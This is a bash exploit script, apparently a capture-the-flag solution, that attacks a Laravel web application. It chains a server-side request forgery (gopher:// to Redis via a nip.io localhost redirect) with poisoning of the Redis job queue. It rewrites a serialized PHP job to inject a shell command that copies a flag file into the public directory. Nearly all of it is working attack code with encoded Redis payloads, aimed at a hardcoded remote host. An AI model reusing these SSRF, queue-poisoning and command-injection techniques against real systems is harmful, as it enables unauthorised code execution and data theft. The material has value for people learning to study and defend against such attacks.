#!/bin/bash

set -e

HOST='localhost:1337'
HOST='83.136.254.37:49929'

urlencode() {
    python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.stdin.read()));"
}

inject_redis() {
    # use http://127.0.0.1.nip.io to redirect to localhost using DNS
    # reaching localhost allows us to contact redis on port 6379 and using the gopher protocol we can send commands to redis
    # we might be able to also use telnet:// but didn't fully test this approach
    ss=$(curl --path-as-is -s -X $'POST' \
        -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36' -H $'Content-Type: application/json' -H $'Accept: */*' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Accept-Encoding: gzip, deflate, br' -H $'Connection: keep-alive' \
        --data-binary "{\"site\":\"gopher://127.0.0.1.nip.io:6379/${1}\"}" \
        "http://${HOST}/api/get-html" | jq -r '.filename')
    curl -s "http://${HOST}/${ss}"
}

# used for debugging
# PING
# QUIT
PING_COMMAND="_*1%0D%0A%244%0D%0APING%0D%0A*1%0D%0A%244%0D%0AQUIT%0D%0A"
# KEYS *
# QUIT
LIST_KEYS="_*2%0D%0A%244%0D%0AKEYS%0D%0A%241%0D%0A*%0D%0A*1%0D%0A%244%0D%0AQUIT%0D%0A"

# do a first injection to generate a first job that we can inject in the future
inject_redis $PING_COMMAND | grep uuid | head -n1

# LRANGE laravel_database_queues:default 0 999
# QUIT
LIST_QUEUE="_*4%0D%0A%246%0D%0ALRANGE%0D%0A%2431%0D%0Alaravel_database_queues:default%0D%0A%241%0D%0A0%0D%0A%241%0D%0A999%0D%0A*1%0D%0A%244%0D%0AQUIT%0D%0A"
queue_data=$(inject_redis $LIST_QUEUE | grep uuid | head -n1)

# put flag on public directory (36 characters long)
payload="';cp /flag /www/public/;echo 'pwnedx"
# modify the the serialized php class so that uuid is replace by a command injectio (36 characters long so we don't have to fiddle with the length as well)
queue_mod_data=$(echo -n $queue_data | sed "s|uuid\\\\\";s:36:\\\\\".\\{36\\}|uuid\\\\\";s:36:\\\\\"${payload}|")

# set the index 0 of the queue since it's the previous one we've retrieved
# LSET laravel_database_queues:default 0 "our serialized payload that's going to be executed"
SET_QUEUE="_*4%0D%0A%244%0D%0ALSET%0D%0A%2431%0D%0Alaravel_database_queues:default%0D%0A%241%0D%0A0%0D%0A%24${#queue_mod_data}%0D%0A$(echo -n $queue_mod_data | urlencode)%0D%0A*1%0D%0A%244%0D%0AQUIT%0D%0A"
inject_redis $SET_QUEUE

echo waiting 600s for injected job to run
# if everything went well we can simply retrieve the flag
sleep 600
curl -s "http://${HOST}/flag"

